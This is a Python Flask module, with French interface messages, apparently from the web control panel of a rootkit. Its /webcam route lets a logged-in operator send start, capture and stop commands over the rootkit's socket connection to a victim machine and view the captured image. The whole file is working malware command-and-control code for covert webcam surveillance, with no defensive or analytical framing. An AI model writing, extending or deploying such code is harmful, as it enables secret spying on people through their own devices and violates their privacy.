import os
from flask import Blueprint, render_template, request, redirect, url_for
from utils.tools import authenticated, rootkit_connection, connection_lock

webcam_bp = Blueprint('webcam', __name__)
CAPTURE_PATH = "/var/www/html/images/capture.jpg"  # à adapter si besoin


@webcam_bp.route('/webcam', methods=['GET', 'POST'])
def webcam():
    if not authenticated:
        return redirect(url_for('auth.login'))

    webcam_output = ""

    if request.method == 'POST':
        action = request.form.get('action')

        try:
            with connection_lock:
                if rootkit_connection:
                    if action == 'start':
                        rootkit_connection.sendall(b"start_webcam\n")
                        webcam_output = "✅ Webcam démarrée."
                    elif action == 'capture':
                        rootkit_connection.sendall(b"capture_image\n")
                        webcam_output = "📸 Image capturée avec succès."
                    elif action == 'stop':
                        rootkit_connection.sendall(b"stop_webcam\n")
                        webcam_output = "🛑 Webcam arrêtée."
                    else:
                        webcam_output = "❌ Action inconnue."
                else:
                    webcam_output = "❌ Rootkit non connecté."
        except Exception as e:
            webcam_output = f"💥 Erreur : {e}"

    image_exists = os.path.exists(CAPTURE_PATH)

    return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=CAPTURE_PATH)
